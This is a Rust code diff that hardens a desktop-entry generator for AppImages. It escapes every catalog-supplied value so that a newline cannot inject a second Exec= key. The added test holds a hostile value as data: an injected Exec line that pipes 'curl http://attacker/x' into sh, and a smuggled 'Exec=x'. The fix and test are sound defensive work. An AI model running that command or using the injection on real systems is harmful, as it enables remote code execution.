@@ -56,20 +56,24 @@ fn value(s: &str) -> String {
 }
 
 /// The entry for `app` installed as the AppImage `appimage`; `icon` when its icon is installed
-/// under the app's id. `None` when the path can't be put in an `Exec=` line.
+/// under the app's id. `None` when the path can't be put in an `Exec=` line, or when a value
+/// the catalog supplied can't be written safely.
 pub fn render(app: &App, appimage: &Path, icon: bool) -> Option<String> {
     let exec = exec_quote(appimage)?;
     let (categories, wm_class) = meta(app);
+    // Every value the catalog supplies goes through the string-value escaping: a newline in
+    // one would otherwise start a new key (notably a second `Exec=`), which the desktop
+    // would then run.
     let mut text = String::from("[Desktop Entry]\nType=Application\n");
     text.push_str(&format!("Name={}\n", value(&app.name)));
     text.push_str(&format!("Comment={}\n", value(&app.tagline)));
     text.push_str(&format!("Exec={exec} %F\n"));
     if icon {
-        text.push_str(&format!("Icon={}\n", app.bundle_id()));
+        text.push_str(&format!("Icon={}\n", value(&app.bundle_id())));
     }
     text.push_str("Terminal=false\n");
-    text.push_str(&format!("Categories={categories}\n"));
-    text.push_str(&format!("StartupWMClass={}\n", wm_class.unwrap_or_else(|| app.bundle_id())));
+    text.push_str(&format!("Categories={}\n", value(&categories)));
+    text.push_str(&format!("StartupWMClass={}\n", value(&wm_class.unwrap_or_else(|| app.bundle_id()))));
     text.push_str(MARKER);
     text.push('\n');
     Some(text)
@@ -126,6 +130,17 @@ mod tests {
 
     fn app(id: &str) -> &App {
         crate::testing::app(id)
+    }
+
+    #[test]
+    fn a_hostile_catalog_value_cannot_inject_a_second_exec_key() {
+        let mut app = crate::testing::app("photocraft").clone();
+        app.wm_class = "x\nExec=/bin/sh -c 'curl http://attacker/x|sh'\nNoDisplay=false".to_string();
+        app.categories = "Utility;Evil\nExec=x;".to_string();
+        let text = render(&app, Path::new("/x/a.AppImage"), true).unwrap();
+        let exec_keys = text.lines().filter(|l| l.starts_with("Exec=")).count();
+        assert_eq!(exec_keys, 1, "only the launcher's own Exec= may exist:\n{text}");
+        assert!(text.contains("\\nExec="), "the newline must be escaped, not a line break:\n{text}");
     }
 
     #[test]
